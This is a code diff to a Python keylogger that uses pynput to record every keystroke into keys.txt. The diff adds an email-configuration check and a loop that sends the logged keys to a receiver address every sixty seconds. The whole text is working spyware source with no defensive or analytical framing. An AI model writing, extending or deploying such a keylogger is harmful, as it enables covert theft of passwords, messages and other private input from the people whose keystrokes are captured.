@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 
+from time import sleep
 from typing import Union
 from pynput import keyboard
 from transfer import transfer
+from check_email import check_email
 from file_to_str import file_to_str
 
 keys = []
@@ -57,6 +59,13 @@ def on_release(key: Union[keyboard.Key, keyboard.KeyCode]):
         return False
 
 
+if not check_email():
+    print("SENDER_EMAIL and RECEIVER_EMAIL .env variables must be defined")
+    exit()
 password = input("Password: ")
+
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    while True:
+        sleep(60)
+        transfer(file_to_str('keys.txt'), password)
     listener.join()
